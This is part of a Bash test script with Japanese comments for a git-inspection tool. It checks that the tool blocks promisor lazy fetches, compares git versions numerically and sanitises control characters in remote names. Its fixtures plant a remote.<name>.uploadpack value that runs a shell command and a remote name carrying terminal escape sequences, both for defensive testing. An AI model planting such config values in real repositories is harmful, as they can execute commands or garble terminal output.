ckf "㊺ 承認の対象外なので承認ダイジェストの行が出ない" inf "$CASE_ERR" '承認ダイジェスト:'
ckf "㊺ 遅延取得を止められないので --out は作られない" test -e "$OUT"
ckeq "㊺ 2.45 未満でも uploadpack が起動されない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
reset_out
runp45 "$GSTUB45" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' \
  --accept 0000000000000000000000000000000000000000000000000000000000000000
ckeq "㊺ どの値を --accept に付けても exit 22" "$RC" 22
reset_out
runp45 "$GSTUB45" --cwd "$R" --precheck
ckeq "㊺ --precheck でも exit 22" "$RC" 22
ckt "㊺ --precheck の stderr に ローカル設定: の行" inf "$CASE_ERR" 'ローカル設定: extensions.partialclone'
ckf "㊺ --precheck でも承認ダイジェストの行が出ない" inf "$CASE_ERR" '承認ダイジェスト:'

# ── ㊺ 版の比較は数値(2.5 を 2.45 以上と誤らない)──
GSTUB45B="$WORK/gitstub45b"
mkdir -p "$GSTUB45B"
sed 's/git version 2\.34\.1/git version 2.5.0/' "$GSTUB45/git" >"$GSTUB45B/git"
chmod +x "$GSTUB45B/git"
ckt "㊺ 2.5.0 を返すスタブになっている" \
  ing <(env PATH="$GSTUB45B:$PATH" git --no-pager version) '^git version 2\.5\.0$'
mk_promisor_repo c45e drop
: >"$SELFTEST_TRACE"
reset_out
runp45 "$GSTUB45B" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㊺ git 2.5.0(文字列比較なら 2.45 以上に見える)でも exit 22" "$RC" 22
ckt "㊺ 2.5.0 でも ローカル設定: の行が出る" inf "$CASE_ERR" 'ローカル設定: extensions.partialclone'
ckeq "㊺ 2.5.0 でも uploadpack が起動されない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0

# ── ㊺ promisor の検出は値を見ない(false でも構成とみなす)──
mk_promisor_repo c45f
GIT "$R" config remote.origin.promisor false
GIT "$R" config --unset extensions.partialClone
: >"$SELFTEST_TRACE"
reset_out
runp45 "$GSTUB45" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㊺ remote.<名>.promisor=false でも promisor 構成とみなす: exit 22" "$RC" 22
ckt "㊺ 値が false でも ローカル設定: の行が出る" \
  ing "$CASE_ERR" "^remote\.origin\.promisor${TB}ローカル設定: remote\.origin\.promisor${TB}$(sha_str 'false')${TB}false\$"

# ── ㊺ 制御文字を含む remote 名(表示の無害化)──
# キー名は利用者が決められるので、NOTE も exit 22 の行も置換を掛けて列が崩れないこと
ESCRN="$(printf 'x\033[2J\ty')"
mk_promisor_repo c45g
GIT "$R" config --unset extensions.partialClone
GIT "$R" config --unset remote.origin.promisor
GIT "$R" config "remote.$ESCRN.promisor" true
GIT "$R" config "remote.$ESCRN.uploadpack" "sh $UP45"
ckne "㊺ 制御文字入りの remote 名を config に置けている" \
  "$(GIT "$R" config --local --list | grep -c 'promisor')" 0
: >"$SELFTEST_TRACE"
reset_out
run45 --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㊺ 制御文字入りの remote 名(2.45 以上): exit 0" "$RC" 0
headf "$OUT"
ckt "㊺ NOTE のキー名に置換が掛かる" inf "$HDF" 'promisor 構成: 遅延取得を無効化して実行(remote.x?[2J?y.promisor)'
ckf "㊺ 見出しに生の ESC が残らない" ing "$HDF" "$(printf '\033')"
ckf "㊺ 見出しに生の TAB が残らない" ing "$HDF" "$TB"
reset_out
run45 --cwd "$R" --precheck
ckeq "㊺ 制御文字入りの remote 名の --precheck: exit 0" "$RC" 0
ckt "㊺ --precheck の NOTE にも置換が掛かる" inf "$CASE_ERR" 'promisor 構成: 遅延取得を無効化して実行(remote.x?[2J?y.promisor)'
ckf "㊺ --precheck の stderr に生の ESC が残らない" ing "$CASE_ERR" "$(printf '\033')"
# 2.45 未満のスタブ: exit 22 の行が TAB ちょうど 3 個の 4 列
: >"$SELFTEST_TRACE"
reset_out
runp45 "$GSTUB45" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㊺ 制御文字入りの remote 名(2.45 未満): exit 22" "$RC" 22
LINE45="$(grep -F 'remote.x?[2J?y.promisor' "$CASE_ERR" | head -1)"
ckeq "㊺ promisor の行は TAB ちょうど 3 個(4 列)" \
  "$(printf '%s' "$LINE45" | tr -cd "$TB" | wc -c | tr -d ' ')" 3
ckt "㊺ 1 列目・2 列目に置換が掛かる" \
  ing <(printf '%s\n' "$LINE45") "^remote\.x?\[2J?y\.promisor${TB}ローカル設定: remote\.x?\[2J?y\.promisor${TB}"
ckf "㊺ exit 22 の stderr に生の ESC が残らない" ing "$CASE_ERR" "$(printf '\033')"
ckeq "㊺ 制御文字入りでも uploadpack が起動されない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0

# ── ㊺ 検査の順序: 基準 commit の tree を消した構成でも痕跡が作られない ──
# 順序を誤った実装(検出より前に --base を解決する・置換参照を引く)では、そこで遅延取得が
# 起き uploadpack の痕跡が作られる
mk_promisor_repo c45d
BT45="$(GIT "$R" rev-parse "$B^{tree}")"
GIT "$R" update-ref "refs/replace/$BT45" "$BT45" 2>/dev/null || true
rm -f "$R/.git/objects/${BT45:0:2}/${BT45:2}"
export SELFTEST_GITLOG="$WORK/gitlog45"
: >"$SELFTEST_GITLOG"
: >"$SELFTEST_TRACE"
reset_out
runp45 "$GSTUB45" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㊺ 基準 tree 欠落 + 置換参照でも exit 22" "$RC" 22
ckeq "㊺ 止まるまでに uploadpack が起動されない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
ckf "㊺ この経路でも --out は作られない" test -e "$OUT"
ckeq "㊺ 止まるまでにオブジェクトを読む git を呼ばない" \
  "$(grep -cE 'ls-files|for-each-ref|cat-file|check-attr|merge-base|update-index|sparse-checkout|hash-object|[[:space:]]diff[[:space:]]' "$SELFTEST_GITLOG" || true)" 0
ckeq "㊺ --base の rev-parse --verify も呼ばれない" \
  "$(grep -E 'rev-parse' "$SELFTEST_GITLOG" | grep -c -- '--verify' || true)" 0
ckne "㊺ git スタブは実際に呼ばれている(記録が空でない)" "$(grep -c . "$SELFTEST_GITLOG")" 0
unset SELFTEST_GITLOG
unset SELFTEST_TRACE

echo
printf '%s\n' "$RESULTS"
echo
echo "結果: PASS ${PASS} 件 / FAIL ${FAIL} 件"
[ "$FAIL" -eq 0 ]
